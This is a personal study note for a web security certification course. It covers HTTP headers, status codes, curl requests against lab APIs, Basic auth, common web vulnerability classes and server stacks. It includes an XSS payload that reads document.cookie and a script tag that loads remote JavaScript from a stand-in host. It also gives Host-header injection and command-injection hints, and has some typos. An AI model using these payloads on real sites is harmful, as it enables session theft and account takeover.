---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "1"
source_file: "CWES.xmind"
---

# Web Fundamental

## Study Companion

### Prerequisites

Basic TCP/IP, URLs, and command-line navigation.

### Learning Outcomes

- Explain HTTP methods, status codes, headers, cookies, and body formats.
- Reproduce browser traffic with `curl` while preserving authentication and content type.
- Identify client/server trust boundaries and likely web vulnerability classes.

### Practice Checkpoint

Capture one complete application workflow and annotate every security-relevant request and response.

### Related Knowledge Map

- [[Maps/Reconnaissance and Tooling|Reconnaissance and Tooling]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Build an accurate model of the authorized web application—HTTP behavior, authentication, APIs, client-side code, server stack, and trust boundaries—so later security tests are correctly scoped, reproducible, and tied to realistic risks.

### Assessment Workflow
1. Decompose each target URL into scheme, authority, port, path, query, and fragment, then map hosts, applications, and microservice/API boundaries.
2. Capture representative HTTP requests and responses; record methods, versions, status codes, redirects, headers, cookies, content types, encodings, and body formats.
3. Reproduce traffic with `curl`, preserving authentication and content type, and test supported CRUD methods only against authorized data.
4. Review page source, DOM, scripts, and network activity for exposed information, client-side trust, hidden inputs, and unsafe rendering.
5. Fingerprint web servers, frameworks, databases, CMS components, and authentication integrations without treating banners as definitive proof.
6. Use the model to prioritize common classes such as broken access control, injection, unsafe upload, file inclusion, XSS, CSRF, and outdated components.
7. Evaluate security headers, cookie attributes, transport protection, logging, and error handling as defense-in-depth controls.

### Key Testing Principles
- HTTP status codes and headers are evidence, but application content and authorization behavior must confirm conclusions.
- Client-side validation and hidden controls are never security boundaries; enforce trust decisions on the server.
- Maintain session integrity when replaying Basic, cookie, token, form, and JSON requests.
- Distinguish relational from non-relational backends and REST from SOAP before choosing tests.
- Use OWASP categories to organize coverage, not as a substitute for application-specific threat modeling.

### Evidence and Reporting
Document the application inventory, request/response exemplars, authentication state, API endpoints and methods, technology confidence, sensitive client-side exposure, and missing or weak controls. Preserve sanitized `curl` or proxy reproductions, screenshots where useful, and clear links from each observation to its security consequence and remediation owner.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **4 yellow/output topics** in this module.

- [[Outputs/Modules/Web Fundamental Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## Fundamental

### Web Requests

- http://admin:password@inflare.com:80/dashpoard.php?login=true#status
  - Scheme	http://
  - User Info	admin:password@
  - Host	inlanefreight.com
  - Port	:80
  - Path	/dashboard.php
  - Query String	?login=true
    - login is parameter
  - Fragments	#status
### Introduction to web application

- HTTP Headers
  - General (Request & Response)
    - Date
      - Example	Description  
        Date: Wed, 16 Feb 2022 10:38:44 GMT
        - Holds the date and time at which the message originated. It's preferred to convert the time to the standard UTC time zone.
    - Connection
      - Connection: close  
        keep-alive
        - Dictates if the current network connection should stay alive after the request finishes
  - Entity Headers (Request & Response) describe the content
    - Content-Type: text/html  
      application/json
      - specifies the media type of the body of the request or response.
        - also can accept binary data
    - Media-Type: application/pdf
      - making the server interpret our input. The charset
    - boundary="b4e4fbd93540"
      - separate content when there is more than one in the same message
    - Content-Length: 385
      - message body Length
    - Content-Encoding: gzip
      - data can be compressed to reduce the message size.
  - Request Headers
    - HTTP Versions
      - 1.x
        - sends requests as clear-text, and uses a new-line character to separate different fields and different requests
      - 2
        - sends requests as binary data in a dictionary form.
      - 3
    - Host: www.inlanefreight.com
      - specify the host being queried for the resource, HTTP servers can be configured to host different websites, This makes the host header an important enumeration target by fuff it can indicate the existence of other hosts on the target server.
        - Host: admin.inlanefreight.com
        - Host: google.com
          - Test for injection, misrouting, redirect (Open redirect, phishing)
        - Host: localhost
          - Trick into accessing internal services (SSRF, unauthorized access)
    - User-Agent: curl/7.77.0
      - describe the client requesting resources.
        - browser, its version, and the operating system.
    - Referer: http://www.inlanefreight.com/
      - Denotes where the current request is coming from.
    - Accept: */*
      - which media types the client can understand.
    - Cookie: PHPSESSID=b4e4fbd93540
      - stored on the client-side, maintaining the client's access.
        - saving user preferences or session tracking.
    - Authorization: BASIC cGFzc3dvcmQK
      - token unique to the client. Unlike cookies, tokens are stored only on the client-side and retrieved by the server per request
  - Response Header
    - Status Code
      - 100 info
        - 100 Continue
      - 200 Succsse
        - 200 OK
        - 201 Created
      - 300 Redirection
        - 301 Moved Permanently
        - 302 Found (or Moved Temporarily)
        - 304 Not Modified
          - Use cached version; nothing changed.
      - 400 Client error
        - 400 Bad Request
          - The server couldn't understand the request.
        - 401 Authprization required
          - missing/invalid credentials
        - 403 forbidden
          - Access denied
        - 404 page not found
        - 405 Method Not Allowed
          - POST Not Allowed for this resource
      - 500 Server error
        - 500 Internal Server Error
          - Server Side error
        - 502 Bad Gateway
          - Invalid response from upstream server.
        - 503 Service Unavailable
          - Server is overloaded or down for maintenance (Server itself)
        - 504 Gateway Timeout
          - A gateway/proxy didn’t get a timely response from another server (Another server)
    - Server: Apache/2.2.14 (Win32)
      - information about the HTTP server, which processed the request. It can be used to gain information about the server, such as its version, and enumerate it further.
    - Set-Cookie: PHPSESSID=b4e4fbd93540
      - Contains the cookies needed for client identification. Browsers
    - WWW-Authenticate: BASIC realm="localhost"
      - Notifies the client about the type of authentication required to access the requested resource.
  - Security Headers
    - Content-Security-Policy: script-src 'self'
      - instructs the browser to accept resources only from certain trusted domains, hence preventing attacks such as (XSS).
    - Strict-Transport-Security: max-age=31536000
      - Prevents the browser from accessing the website over the plaintext HTTP
    - Referrer-Policy: origin
      - Dictates whether the browser should include the value specified via the Referer header or not. It can help in avoiding disclosing sensitive URLs
- curl
  - Flags
    - -v
      - See the HTTP request and Response in verbose mode
        - -vvv
          - more
    - -I
      - send a HEAD request and only display the response headers.
    - -i
      - Response Header + body
    - -A 'Mozilla/5.0'
      - Set Custom User Agent
    - -u admin:password
      - Send Credentials
    - -X POST
      - specify HTTP Method
    - -L
      - Follow redirect
        - use -i or -v to get the cookie
    - -b 'PHPSESSID=c1...'
      - use Cookie in the request
        - or -H 'Cookie: PHPSSID=c1..'
    - -H
      - add custom Header
  - see page HTML content
    - curl http://ip
  - Download file
    - curl -O http://ip/file
  - Skip SSL verification
    - crl -k http://ip
  - CRUD API
    - Read data
      - curl http://<SERVER_IP>:<PORT>/api.php/city/london  
        [{"city_name":"London","country_name":"(UK)"}]
        - properly formatted in JSON
          - curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq
            - search
              - ... /city/le | jq
      - retrieve all entries in the table:
        - curl -s http://94.237.123.87:34537/api.php/city/ | jq
          - curl -s http://94.237.123.87:34537/api.php/city/london | jq  
            "city_name": "London",  
            "country_name": "(UK)"
    - Edit Content-type
      - curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -H 'Content-Type: application/json'
    - Change data
      - PUT
        - curl -X PUT http://94.237.123.87:34537/api.php/city/london \ -H "Content-Type: application/json" \ -d '{"city_name": "flag", "country_name": "(UK)"}'
          - curl -s http://94.237.123.87:34537/api.php/city/flag | jq  
            "city_name": "flag",  
            "country_name": "(UK)"
      - PATCH
    - Delete
      - curl -X DELETE http://94.237.123.87:34537/api.php/city/baltimore   -H "Content-Type: application/json"   -d '{"city_name": "baltimore", "country_name": "(US)"}'
### Basic Authentication

- curl -i http://ip  
  HTTP/1.1 401 Authorization required  
  WWW-Authenticate: Basic realm="Access denied"  
  Acess denied
  - curl -u admin:admin http://ip
  - curl -v http://admin:admin@ip  
    >Authorization: Basic YWRtaW46YWRtaW4= (base64 for admin:admin)
  - curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://ip
  - in Devtool > Network > Right click on search.php?search=UK
    - Copy value> Copy as
      - curl
      - powershell
      - Fetch (Javascript)
        - on Console
          - allow pasting
          - Paste it on console
      - Copy URL Parameter
  - curl -u admin:admin 'http://94.237.55.43:57467/search.php?search=flag'
### POST request

- data sent by JSON  
  {"search":"London"}
  - must have specified the Content-Type header to be application/json.
    - curl -X POST -d '{"search":"london"}' -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php ["London (UK)"]
### Web Applicaion Distribution

- open source
  - Wordpress
    - Content Management Systems (CMS)
  - OpenCart
  - Joomla
- closed source
  - wix
  - Shopify
  - DotNetNuke
### Web integrated to Active directory

- We often find SQL injection vulnerabilities on web applications that use Active Directory for authentication.
  - While we can usually not leverage this to extract passwords
- we can often pull most or all Active Directory user email addresses
  - This data can then be used to perform a password spraying attack against web portals
- Flaws
  - Flaw	Real-world Scenario
  - SQL injection
    - Obtaining Active Directory usernames and performing a password spraying attack against a VPN or email portal.
  - File Inclusion
    - Reading source code to find a hidden page or directory which exposes additional functionality that can be used to gain remote code execution.
  - Unrestricted File Upload
    - A web application that allows a user to upload a profile picture that allows any file type to be uploaded (not just images). This can be leveraged to gain full control of the web application server by uploading malicious code.
  - Insecure Direct Object Referencing (IDOR)
    - When combined with a flaw such as broken access control, this can often be used to access another user's files or functionality. An example would be editing your user profile browsing to a page such as /user/701/edit-profile. If we can change the 701 to 702, we may edit another user's profile!
  - Broken Access Control
    - Another example is an application that allows a user to register a new account. If the account registration functionality is designed poorly, a user may perform privilege escalation when registering. Consider the POST request when registering a new user, which submits the data username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3. What if we can manipulate the roleid parameter and change it to 0 or 1. We have seen real-world applications where this was the case, and it was possible to quickly register an admin user and access many unintended features of the web application.
### web content

- Microservice
  - Registration
  - Search
  - Payments
  - Ratings
  - Reviews
- Web PT types
  - open source
    - likely have access to Local File Inclusion on Back end
      - Code review
  - Subtopic 2
### Top 10 Developers mistake

- 1.	Permitting Invalid Data to Enter the Database
- 2.	Focusing on the System as a Whole
- 3.	Establishing Personally Developed Security Methods
- 4.	Treating Security to be Your Last Step
- 5.	Developing Plain Text Password Storage
- 6.	Creating Weak Passwords
- 7.	Storing Unencrypted Data in the Database
- 8.	Depending Excessively on the Client Side
- 9.	Being Too Optimistic
- 10.	Permitting Variables via the URL Path Name
- 11.	Trusting third-party code
- 12.	Hard-coding backdoor accounts
- 13.	Unverified SQL injections
- 14.	Remote file inclusions
- 15.	Insecure data handling
- 16.	Failing to encrypt data properly
- 17.	Not using a secure cryptographic system
- 18.	Ignoring layer 8
- 19.	Review user actions
- 20.	Web Application Firewall misconfigurations
### OWASP Top 10

- 1.	Broken Access Control
- 2.	Cryptographic Failures
- 3.	Injection
- 4.	Insecure Design
- 5.	Security Misconfiguration
- 6.	Vulnerable and Outdated Components
- 7.	Identification and Authentication Failures
- 8.	Software and Data Integrity Failures
- 9.	Security Logging and Monitoring Failures
- 10.	Server-Side Request Forgery (SSRF)
### DOM Document Object Model

- objects
  - html
  - head
  - title
  - script
  - h1
- Types
  - Core DOM
  - XML DOM
  - HTML DOM
- examples for DOM
  - document.head
  - document.h1
### Javascript

## Introduction

### Sensitive Data Exposure

- Source code
  - Look For Credentials
    - View Page Source
    - CTRL U
    - view-source:https://www.google.com/
### HTML Injection

- How to know
  - if user input dsiplay in the page without sanitization
  - try
    - bold text
      - <b>Hello</b>
    - change the background
      - <style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
- Example for malicious HTML Injection
  - web defacement
- if its work
  - XSS is possible
### Cross Site Scripting (XSS)

- types
  - Reflected
    - in URL
  - Stored
    - in Database
  - DOM
    > user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).
    - #"><img src=/ onerror=alert(document.cookie)>
      - cookie can be stolen to authenticate
### Cross Site Request Forgery (SCRF)
> Used to gain Higher privileges by crafting Javascript payload to reset password

- Use
  - instead of use previous command to restore cookie we will load remote remote javascript
    - "><script src=//www.example.com/exploit.js></script>
- Prevention
  - Sanitization (Front end)
    - Removing special characters and non-standard characters from user input before displaying it or storing it.
  - Validation (Back end)
    - Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)
  - clear any special/non-standard characters. In case an attacker manages to bypass
  - WAF
  - Cookie Attributes
    - Samesite=strict or Lax
      - restrict browsers from including authentication cookies in cross-origin requests
### Back end Servers

- Combinations
  - LAMP
    - Linux, Apache, MySQL, PHP
  - WAMP
    - Windows, Apache, MySQL, PHP
  - WINS
    - Windows, IIS, .NET, SQL Server
  - MAMS
    - macOS, Apache, MySQL, PHP
  - XAMPP
    - Crossplatform, Apache,, MySQL, PHP/PERL
### Web Servers

- Types
  - Apache / httpd
    - Integration with langauages
      - bash
        - by using CGI
      - Python
      - PHP
        - mod_php
      - Perl
      - .NET
  - NGINX
    - focuses on serving many concurrent web requests with relatively low memory and CPU load
      - very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites,
  - IIS
    - optimized for Active Directory
  - Apache Tomcat for Java
  - Node.JS
    - developed using JavaScript on the back end.
### Databases

- Relational (SQL)
  - Types
    - Amazon Aurora
    - MySQL
    - MSSQL
    - Oracle
    - PostgreSQL
    - SQLite
    - MariaDB
    - Azure SQL
- Non Relational (NoSQL)
  - Storage Modules
    - Key:Value
      - JSON
      - XML
    - Document Based
    - Wide Column
    - Graph
  - Types
    - Amazon DynamoDB
    - MongoDB
    - ElasticSearch
    - Apache Casandra
    - Redis
    - Neo4j
    - CouchDB
    - Google's Firebase
- Connecting to DB
  - MySQL - PHP
    - Connect to DB server
      - $conn = new mysqli("localhost", "user", "pass");
    - create a new database
      - $sql = "CREATE DATABASE database1";
      - $conn->query($sql)
        - Connect to new DB
          - $conn = new mysqli("localhost", "user", "pass", "database1");
          - $query = "select * from table_1";
          - $result = $conn->query($query);
### Development Framwork & API

- Frameworks
  - Larvel (PHP)
    - for startup companies
  - Express (Node.JS)
  - Django (Python)
  - Rails (Ruby)
- API
  - Standards
    - SOAP (Simple Object Access)
      - XML
    - REST
      - Sahres data through URL  
        break web functunality into smaller
        - Usually in JSON
  - example
    - curl 94.237.120.223:58055/index.php?id=1  
      superadmin
### Common Web Vulnerabilities
> even if its simple some developer not pay attension to it

- Broken Auhtnetication
  - Unauthorized Login
- Broken Access Control
  - Another Privilege
- Malicious File Upload
  - Upload PHP script for example
    - WordPress Plugin Responsive Thumbnail Slider 1.0
      - can be bypass by double extension
- Command Injection
  - WordPress Plugin Plainview Activity Monitor 20161228
    - command in the ip value, by simply adding | COMMAND... after the ip value
- SQL Injection
### Public CVE

- Resources
  - ExploitDB
  - Rapid7
  - Vulnerability Lab
    - https://www.vulnerability-lab.com/
- Back-end Server Vulnerabilities
  - Shell-Shock
